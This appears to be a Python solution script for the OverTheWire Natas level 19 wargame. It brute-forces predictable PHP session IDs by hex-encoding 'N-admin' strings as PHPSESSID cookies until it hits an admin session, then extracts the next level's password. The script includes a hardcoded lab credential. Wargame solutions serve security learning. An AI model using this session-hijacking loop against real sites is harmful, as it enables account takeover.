import requests
from requests.auth import HTTPBasicAuth
import binascii

username = "natas19"
password = "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"
url = "http://natas19.natas.labs.overthewire.org/"

begin = input("Input the begin id: ")
end = input("input the end id: ")
for i in range(int(begin), int(end)):
    session_id = f"{i}-admin"
    hex_str = binascii.hexlify(session_id.encode()).decode()

    cookies = {"PHPSESSID": hex_str}
    response = requests.get(
        url, auth=HTTPBasicAuth(username, password), cookies=cookies
    )

    print(f"Session {i}: {hex_str}")

    if "You are an admin" in response.text:
        start = response.text.find("Password: ") + 10
        end = response.text.find("</pre>", start)

        natas20_pw = response.text[start:end].strip()
        print(f"Password: {natas20_pw}")
        print("Finish!")
        break
